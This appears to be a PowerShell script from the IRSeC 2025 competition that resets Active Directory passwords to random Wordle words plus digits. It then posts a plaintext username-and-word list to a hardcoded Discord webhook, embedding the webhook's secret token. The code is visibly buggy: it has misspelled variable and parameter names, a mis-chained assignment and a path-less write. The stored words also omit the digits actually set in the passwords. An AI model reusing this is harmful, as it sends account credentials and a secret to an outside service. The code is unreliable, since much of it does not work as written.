#Hiiii, this script generates wordles!
Import-Module ActiveDirectory
[int[]]$UsedWordles = @()
$PathToRepo = Read-Host -Prompt "please enter the path to the repository"
$AbsPath = "$PathToRepo\Wordle-Generator-IRSeC-2025-\WordleGenerator\"
$Wordles = Get-Content -Path "$AbsPath\Wordles.txt"
$WordleSolutions = "$AbsPath\WordleSolutions.txt"
$LocalPlayers = Get-Content -Path "$AbsPath\LocalPlayers.txt"
$InternationalPlayers = Get-Content -Path "$AbsPath\InternationalPlayers.txt"
$DiscordIntegrationURL = "https://discord.com/api/webhooks/1431335730847809570/zk6rGK7eGT668ln_MucRzTbmYt4d_qRzpm8HuV2358K2bxQplrGkXr7mYkR5HlWLWO-x"

function Create-Wordle {
    param (
        [string[]]$Players
    )
    Clear-Content -Path "$WordleSolutions"
    foreach ($Username in $Players){
        $RandomIndex = Get-random -Minimum 0 -Maximum $Wordles.Count
        while ($UsedWordles -contains $RandomIndex) {
            $RandomIndex = Get-random -Minimum 0 -Maximum $worldes.Count
        }
        $UsedWordles += $RandomIndex
        $YourWordle = $Wordles[$RandomIndex]
        $FunnyNumbers = $RandomIndex = Get-random -Minimum 1000 -Maximum 9999
        $SecureWordle = ConvertTo-SecureString $YourWordle + $FunnyNumbers -AsPlainText -Force
        try {
            Set-ADAccountPassword -Identity $Username -NewPassword $SecureWordle -Reset -ErrorAction Stop
            Add-Content -Path $WordleSolutions -Value "$Username | $YourWordle"
            echo "Content added: $Username | $YourWordle"
        } 
        catch {
            Write-Host "Error encountered with $Username, could not assign PW"
            Add-Content "Error encountered with $Username, could not assign PW of $YourWordle"
        }
    }   
}

Create-Wordle -Pleyers InternationalPlayers
#fuck this shit
$message = "testing:"

Add-Type -AssemblyName System.Net.Http

$client = [System.Net.Http.HttpClient]::new()
$content = [System.Net.Http.MultipartFormDataContent]::new()

$stringContent = [System.Net.Http.StringContent]::new($message)
$content.Add($stringContent, "content")

$fileStream = [System.IO.FileStream]::new($WordleSolutions, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
$fileContent = [System.Net.Http.StreamContent]::new($fileStream)
$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
$content.Add($fileContent, "file", [System.IO.Path]::GetFileName($WordleSolutions))

$response = $client.PostAsync($DiscordIntegrationURL, $content).Result
Write-Host "Status: $($response.StatusCode)"

$fileStream.Dispose()
$client.Dispose()

# $body = @{
#     content = "@everyone New Wordles Dropped!"
# }
# $form = @{
#     file = Get-Item $WordleSolutions
# }

# Invoke-RestMethod -Uri $DiscordIntegrationURL -Method Post -Form $Form -Body $body


#curl.exe -F "file=@`"$WordleSolutions`"" -F "New Wordles Dropped" $DiscordIntegrationURL



